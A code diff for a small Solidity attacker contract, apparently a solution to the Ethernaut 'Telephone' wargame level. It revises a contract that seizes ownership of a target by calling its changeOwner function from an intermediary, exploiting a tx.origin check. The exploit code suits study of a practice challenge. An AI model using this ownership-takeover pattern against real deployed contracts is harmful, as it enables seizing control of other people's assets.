@@ -5,14 +5,13 @@ interface ITelephone {
     function changeOwner(address _owner) external;
 }
 
-contract TelephoneAttacker {
-    ITelephone public telephone;
-
+contract Attacker {
+    ITelephone itelephone;
     constructor(address _telephone) {
-        telephone = ITelephone(_telephone);
+        itelephone = ITelephone(_telephone);
     }
 
-    function attack() external {
-        telephone.changeOwner(tx.origin);
+    function changeOwnerAttack() public {
+        itelephone.changeOwner(msg.sender);
     }
 }
